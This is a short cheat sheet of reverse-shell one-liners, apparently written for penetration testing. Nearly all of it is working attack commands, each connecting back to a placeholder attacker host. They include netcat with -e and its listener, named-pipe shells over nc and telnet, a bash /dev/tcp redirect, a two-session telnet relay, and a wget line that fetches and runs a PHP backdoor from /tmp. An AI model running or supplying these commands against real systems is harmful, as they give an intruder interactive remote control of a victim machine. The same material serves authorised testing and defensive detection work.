# Reverse Shell

## Netcat

Target machine connect back to the attack machine

```text
nc [ip addr] [port] -e [shell]
```

Attack machine listener

```text
nc -n -vv -l -p [port]
```

## netcat with GAPING\_SECURITY\_HOLE disabled

Target machine connect back to the attack machine with `GAPING_SECURITY_HOLE` disabled

```text
mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
```

## netcat without netcat

It takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system.

### Target Machine

```text
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
```

## netcat without netcat or /dev/tcp

### Target Machine

```text
mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
```

## telnet-to-telnet

This technique uses two telnet sessions connected to remote listeners to pipe input from one telnet session to /bin/bash, and pipe the output to the second telnet session. Commands are entered into one the of the attackers listeners and feedback is received on the other.

```text
telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
```

## PHP reverse shell via interactive console

The last technique makes use of the php interactive console. The attacker issues one command which moves to the /tmp directory \(because it is typically world writable\), uses wget to download a malicious php reverse\_tcp backdoor \(which the attacker hosts on a web server that he controls\), and executes the backdoor via the interactive console.

### Target Machine

```text
cd /tmp && wget -O bd.php <attacker ip address>/mypayload.php.txt && php -f bd.php
```

